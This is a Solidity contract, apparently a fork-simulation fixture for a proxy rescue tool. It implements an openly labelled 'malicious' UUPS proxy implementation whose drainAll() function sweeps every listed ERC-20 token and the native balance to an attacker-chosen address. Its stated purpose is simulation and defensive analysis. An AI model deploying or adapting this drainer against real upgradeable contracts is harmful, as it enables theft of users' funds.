// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title MaliciousImpl
/// @notice Minimal "attacker implementation" injected via anvil_setCode on a
///         fork. After the attacker calls upgradeTo(thisAddress) on the proxy,
///         all subsequent calls to the proxy delegatecall into this code.
///
///         drainAll() sweeps every listed ERC-20 + native balance to `to`.
///         Because the proxy delegatecalls, `address(this)` inside the call
///         is the PROXY's address, so balanceOf(address(this)) returns the
///         proxy's holdings.
///
///         This contract is NEVER deployed on mainnet. It exists only as
///         compiled bytecode embedded in rescue-prove.ts for fork simulation.

contract MaliciousImpl {
    /// @notice Sweep all listed tokens + native to `to`.
    ///         Uses low-level calls so non-compliant ERC-20s don't revert
    ///         the entire transaction.
    function drainAll(address[] calldata tokens, address payable to) external {
        for (uint256 i = 0; i < tokens.length; i++) {
            // balanceOf(address) — low-level staticcall, skip token on failure
            (bool balOk, bytes memory balRet) = tokens[i].staticcall(
                abi.encodeWithSelector(0x70a08231, address(this))
            );
            if (!balOk || balRet.length < 32) continue;
            uint256 bal = abi.decode(balRet, (uint256));
            if (bal == 0) continue;

            // transfer(to, bal) — low-level call, skip token on failure
            (bool txOk, ) = tokens[i].call(
                abi.encodeWithSelector(0xa9059cbb, to, bal)
            );
            if (!txOk) continue; // non-compliant or guarded — skip, don't revert
        }

        uint256 nativeBal = address(this).balance;
        if (nativeBal > 0) {
            (bool ok, ) = to.call{value: nativeBal}("");
            if (!ok) revert("native transfer failed");
        }
    }

    /// @notice EIP-1822 proxiableUUID — required by UUPS proxies to accept
    ///         upgradeToAndCall. Returns the EIP-1967 implementation slot.
    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    receive() external payable {}
}
